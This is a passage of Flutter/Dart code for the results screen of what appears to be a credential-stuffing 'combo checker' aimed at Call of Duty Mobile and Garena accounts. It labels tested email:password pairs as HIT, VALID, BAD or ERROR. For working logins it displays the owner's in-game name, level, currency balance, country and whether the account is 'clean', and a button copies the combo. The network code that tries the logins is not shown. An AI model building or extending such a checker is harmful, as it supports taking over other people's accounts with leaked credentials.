            onPressed: _reset,
            style: ElevatedButton.styleFrom(
              backgroundColor: c.surface,
              foregroundColor: _accent,
              shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(12),
                  side: BorderSide(color: _accent.withOpacity(0.4))),
              elevation: 0,
              padding: const EdgeInsets.symmetric(vertical: 13, horizontal: 16),
            ),
            icon: const Icon(Icons.refresh_rounded, size: 16),
            label: const Text('Reset', style: TextStyle(fontWeight: FontWeight.w700, fontSize: 13)),
          ),
        ],
      ]),
      if (_running) ...[
        const SizedBox(height: 10),
        LinearProgressIndicator(
          value: _total > 0 ? _checked / _total : null,
          backgroundColor: _accent.withOpacity(0.15),
          valueColor: const AlwaysStoppedAnimation<Color>(_accent),
          borderRadius: BorderRadius.circular(10),
          minHeight: 4,
        ),
      ],
    ]),
  );

  Widget _buildResultCard(_CodmResult r, XissinColors c) {
    Color statusColor;
    IconData statusIcon;
    String statusLabel;

    switch (r.status) {
      case _Status.hit:
        statusColor = const Color(0xFF2ECC71);
        statusIcon  = Icons.check_circle_rounded;
        statusLabel = 'HIT ✅';
      case _Status.noAccount:
        statusColor = const Color(0xFF5B8CFF);
        statusIcon  = Icons.account_box_outlined;
        statusLabel = 'VALID (No CODM) 🔵';
      case _Status.bad:
        statusColor = const Color(0xFFFF6B6B);
        statusIcon  = Icons.cancel_rounded;
        statusLabel = 'BAD ❌';
      case _Status.error:
        statusColor = const Color(0xFFFFA94D);
        statusIcon  = Icons.warning_amber_rounded;
        statusLabel = 'ERROR ⚠️';
    }

    return Container(
      margin: const EdgeInsets.only(bottom: 10),
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
        color:        statusColor.withOpacity(0.06),
        borderRadius: BorderRadius.circular(14),
        border:       Border.all(color: statusColor.withOpacity(0.25)),
      ),
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        // Header row
        Row(children: [
          Icon(statusIcon, color: statusColor, size: 15),
          const SizedBox(width: 6),
          Text(statusLabel, style: TextStyle(
              color: statusColor, fontSize: 12, fontWeight: FontWeight.w700)),
          const Spacer(),
          GestureDetector(
            onTap: () {
              Clipboard.setData(ClipboardData(text: r.combo));
              HapticFeedback.selectionClick();
            },
            child: Icon(Icons.copy_rounded, color: statusColor.withOpacity(0.7), size: 13),
          ),
        ]),
        const SizedBox(height: 6),

        // Combo
        Text(r.combo,
            style: TextStyle(color: c.textPrimary, fontSize: 11, fontFamily: 'monospace'),
            maxLines: 1, overflow: TextOverflow.ellipsis),

        // CODM details (only for hits)
        if (r.status == _Status.hit && r.nickname.isNotEmpty) ...[
          const SizedBox(height: 8),
          const Divider(height: 1, color: Colors.white12),
          const SizedBox(height: 8),
          _detailRow('🎮 IGN',    r.nickname.isNotEmpty ? r.nickname : '—', c),
          _detailRow('⚡ Level',  r.level.isNotEmpty    ? r.level    : '—', c),
          _detailRow('🌍 Region', r.region.isNotEmpty   ? r.region   : '—', c),
          _detailRow('💎 Shells', r.shell.isNotEmpty    ? r.shell    : '—', c),
          _detailRow('🌐 Country',r.country.isNotEmpty  ? r.country  : '—', c),
          _detailRow('🔒 Clean',  r.isClean             ? 'YES ✅'   : 'NO ❌', c),
        ],

        // Valid Garena details
        if (r.status == _Status.noAccount && r.shell.isNotEmpty) ...[
          const SizedBox(height: 8),
          const Divider(height: 1, color: Colors.white12),
          const SizedBox(height: 8),
          _detailRow('💎 Shells',  r.shell.isNotEmpty   ? r.shell   : '—', c),
          _detailRow('🌐 Country', r.country.isNotEmpty ? r.country : '—', c),
          _detailRow('🔒 Clean',   r.isClean            ? 'YES ✅'  : 'NO ❌', c),
        ],

        // Error/bad detail
        if ((r.status == _Status.bad || r.status == _Status.error) && r.detail.isNotEmpty) ...[
          const SizedBox(height: 4),
          Text(r.detail,
              style: TextStyle(color: statusColor.withOpacity(0.7), fontSize: 10)),
        ],
      ]),
    );
  }

  Widget _detailRow(String label, String value, XissinColors c) => Padding(
    padding: const EdgeInsets.only(bottom: 3),
    child: Row(children: [
      SizedBox(width: 80,
          child: Text(label, style: TextStyle(color: c.textHint, fontSize: 10))),
      Expanded(child: Text(value,
          style: TextStyle(color: c.textPrimary, fontSize: 10, fontWeight: FontWeight.w600),
          maxLines: 1, overflow: TextOverflow.ellipsis)),
    ]),
  );
}
